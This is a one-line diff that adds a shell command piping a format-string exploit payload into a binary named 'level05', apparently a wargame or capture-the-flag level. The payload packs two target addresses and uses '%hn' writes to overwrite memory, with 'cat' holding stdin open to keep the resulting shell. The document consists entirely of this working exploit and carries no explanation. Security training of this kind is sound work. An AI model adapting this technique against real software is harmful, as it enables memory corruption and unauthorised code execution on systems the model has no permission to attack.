@@ -1,0 +1,1 @@
+(python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%55570d%11$hn" + "%9957d%10$hn"'; cat) | ./level05
